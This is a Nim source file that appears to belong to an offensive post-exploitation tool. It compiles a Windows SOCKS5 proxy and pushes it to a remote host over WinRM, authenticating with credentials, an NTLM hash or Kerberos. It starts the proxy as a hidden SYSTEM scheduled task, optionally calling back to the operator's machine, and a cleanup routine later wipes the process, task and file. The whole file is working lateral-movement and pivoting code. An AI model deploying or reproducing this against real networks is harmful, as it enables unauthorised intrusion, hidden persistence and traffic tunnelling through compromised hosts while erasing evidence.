import std/[strutils, os, osproc, random, times, net]

import ../winrm/client as winrm
import svc/socksctrl as socksctrl

const socksSource = staticRead("svc/nimuxsocks.nim")

const crossFlags = " -d:mingw --cpu:amd64 --os:windows --threads:on --tlsEmulation:off -d:release --opt:size" &
                   " --cc:gcc --gcc.exe:x86_64-w64-mingw32-gcc" &
                   " --gcc.linkerexe:x86_64-w64-mingw32-gcc --passL:-static" &
                   " --mm:arc"

type
  SocksDeployResult* = object
    host*: string
    port*: int
    socksPort*: int
    success*: bool
    message*: string
    remotePath*: string
    pid*: string
    taskName*: string

proc randomToken(): string =
  var rng = initRand(int(getTime().toUnix()) xor cast[int](addr result))
  for _ in 0 ..< 10:
    let c = rng.rand(35)
    if c < 10: result.add chr(ord('0') + c)
    else: result.add chr(ord('a') + (c - 10))

proc buildSocksProxyBinary*(): string =
  let tmp = getTempDir() / "nimuxsocks_build_" & $getCurrentProcessId()
  createDir(tmp)
  try:
    writeFile(tmp / "nimuxsocks.nim", socksSource)
    let exe = tmp / "nimuxsocks.exe"
    let cmd = "nim --skipParentCfg:on c" & crossFlags & " --app:console" &
              " --threads:on" &
              " --nimcache:" & tmp / "cache" &
              " -o:" & exe & " " & tmp / "nimuxsocks.nim"
    let (output, code) = execCmdEx(cmd)
    if code != 0:
      raise newException(IOError, "socks compile failed:\n" & output)
    result = readFile(exe)
  finally:
    removeDir(tmp)

proc deploySocksProxy*(
  host: string; port, timeoutMs, socksPort: int;
  username, password, ntlmHash, domain: string;
  socksAuth = "";
  bindAddr = "0.0.0.0";
  useSsl = false;
  kerberos = false;
  userProcess = false;
  reverseHost = "";
  reversePort = 0
): SocksDeployResult =
  result.host = host
  result.port = port
  result.socksPort = socksPort

  var exeBytes: string
  try:
    exeBytes = buildSocksProxyBinary()
  except CatchableError as e:
    result.message = "compile failed: " & e.msg.splitLines()[0]
    return

  let token = randomToken()
  let remoteName = "nimproxy" & token & ".exe"

  let authMethod = if kerberos: winrm.wamKerberos else: winrm.wamNtlm

  let getTemp = winrm.runWinRmCommand(host, port, username, password, ntlmHash, domain,
    "[System.IO.Path]::GetTempPath().TrimEnd('\\')", useSsl, authMethod,
    forcePsrp = true)
  if not getTemp.success:
    result.message = "WinRM auth failed: " & getTemp.message
    return
  let tempDir = getTemp.output.strip().replace("\r", "").replace("\n", "")
  if tempDir.len == 0:
    result.message = "could not get remote TEMP path"
    return
  result.remotePath = tempDir & "\\" & remoteName

  let localExe = getTempDir() / ("nimproxy_upload_" & token & ".exe")
  try:
    writeFile(localExe, exeBytes)
    let upload = winrm.winRmUploadFile(host, port, username, password, ntlmHash, domain,
      localExe, result.remotePath, useSsl, authMethod)
    if not upload.success:
      result.message = "upload failed: " & upload.message
      return
  finally:
    try: removeFile(localExe) except CatchableError: discard

  let testPs = "if(Test-Path '" & result.remotePath & "'){'found'}else{'missing'}"
  let testResult = winrm.runWinRmCommand(host, port, username, password, ntlmHash, domain,
    testPs, useSsl, authMethod, forcePsrp = true)
  let testOut = testResult.output.strip().replace("\r", "").replace("\n", "")
  if testOut != "found":
    result.message = "uploaded file not found at " & result.remotePath & " (got: " & testOut & ")"
    return

  var effectiveReverseHost = reverseHost
  if effectiveReverseHost.len == 0 and reversePort > 0:
    try:
      let s = newSocket()
      s.connect(host, Port(port))
      let localAddr = s.getLocalAddr()
      effectiveReverseHost = localAddr[0]
      s.close()
    except CatchableError: discard

  var args =
    if effectiveReverseHost.len > 0 and reversePort > 0:
      "--reverse " & effectiveReverseHost & " --reverse-port " & $reversePort
    else:
      "--bind " & bindAddr & " --port " & $socksPort
  if socksAuth.len > 0:
    args.add " --auth " & socksAuth
  let taskName = "nimproxy" & token

  discard winrm.runWinRmCommand(host, port, username, password, ntlmHash, domain,
    "Get-Process -Name nimproxy* -EA 0|Stop-Process -Force -EA 0;" &
    "Get-ScheduledTask -TaskPath '\\' -EA 0|" &
    "Where-Object{$_.TaskName -like 'nimproxy*'}|" &
    "ForEach-Object{Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false -EA 0};" &
    "'cleaned'",
    useSsl, authMethod, forcePsrp = true)
  let exeBase = remoteName[0 ..< remoteName.len - 4]
  let userSpec = if domain.len > 0: domain & "\\" & username else: username
  let processStartPs = "try{" &
    "$p=Start-Process -FilePath '" & result.remotePath & "' -ArgumentList '" & args & "' -WindowStyle Hidden -PassThru;" &
    "Start-Sleep -Seconds 2;" &
    "('process:'+$p.Id)" &
    "}catch{'err:'+$_.Exception.Message}"
  let taskStartPs = "try{" &
    "$mode='task';$pidOut='';" &
    "$ts=New-Object -ComObject Schedule.Service;$ts.Connect();" &
    "$f=$ts.GetFolder('\\');$td=$ts.NewTask(0);" &
    "$td.Settings.Hidden=$true;$td.Settings.ExecutionTimeLimit='PT0S';" &
    "$td.Settings.StartWhenAvailable=$true;" &
    "$a=$td.Actions.Create(0);" &
    "$a.Path='" & result.remotePath & "';" &
    "$a.Arguments='" & args & "';" &
    "try{$null=$f.RegisterTaskDefinition('" & taskName & "',$td,6,'SYSTEM',$null,5,$null)}" &
    "catch{$null=$f.RegisterTaskDefinition('" & taskName & "',$td,6,'" & userSpec & "',$null,2,$null)};" &
    "$f.GetTask('" & taskName & "').Run($null)|Out-Null;" &
    "Start-Sleep -Seconds 3;" &
    "$pidOut=(Get-Process -Name " & exeBase & " -EA 0|Select-Object -First 1).Id;" &
    "if(-not $pidOut){throw 'task started but process not found'};" &
    "($mode+':'+$pidOut)" &
    "}catch{" &
    processStartPs &
    "}"
  let startPs = if userProcess: processStartPs else: taskStartPs
  let startResult = winrm.runWinRmCommand(host, port, username, password, ntlmHash, domain,
    startPs, useSsl, authMethod, forcePsrp = true)
  if not startResult.success:
    result.message = "start failed: " & startResult.message
    return
  let startOut = startResult.output.strip().replace("\r", "").replace("\n", "")
  if startOut.startsWith("err:"):
    result.message = "start error: " & startOut
    return
  if startOut.startsWith("task:"):
    result.pid = startOut["task:".len .. ^1]
    result.taskName = taskName
  elif startOut.startsWith("process:"):
    result.pid = startOut["process:".len .. ^1]
    result.taskName = ""
  else:
    result.pid = startOut
    result.taskName = taskName
  result.success = true
  result.message =
    if result.taskName.len > 0: "socks5 proxy running via scheduled task"
    else: "socks5 proxy running in user context"

proc runReverseSocksController*(socksBind: string; socksPort, controlPort: int) =
  {.cast(gcsafe).}:
    socksctrl.runSocksServer(socksctrl.SocksServerArgs(
      bindAddr: socksBind,
      socksPort: socksPort,
      ctrlPort: controlPort))

proc killSocksProxy*(
  host: string; port, timeoutMs: int;
  username, password, ntlmHash, domain: string;
  remotePath, pid, taskName: string;
  useSsl = false;
  kerberos = false
): tuple[ok: bool; message: string] =
  let authMethod = if kerberos: winrm.wamKerberos else: winrm.wamNtlm
  var ps = ""
  if pid.len > 0:
    ps.add "try{Stop-Process -Id " & pid & " -Force -ErrorAction SilentlyContinue}catch{}"
  if ps.len > 0: ps.add ";"
  ps.add "Stop-Process -Name nimproxy* -Force -ErrorAction SilentlyContinue"
  if taskName.len > 0:
    ps.add ";try{$ts=New-Object -ComObject Schedule.Service;$ts.Connect();" &
      "$ts.GetFolder('\\').DeleteTask('" & taskName & "',0)}catch{}"
  if remotePath.len > 0:
    ps.add ";Start-Sleep -Milliseconds 500;Remove-Item '" & remotePath & "' -Force -ErrorAction SilentlyContinue"
  let r = winrm.runWinRmCommand(host, port, username, password, ntlmHash, domain,
    ps, useSsl, authMethod, forcePsrp = true)
  if r.success:
    result = (true, "proxy stopped and removed")
  else:
    result = (false, r.message)
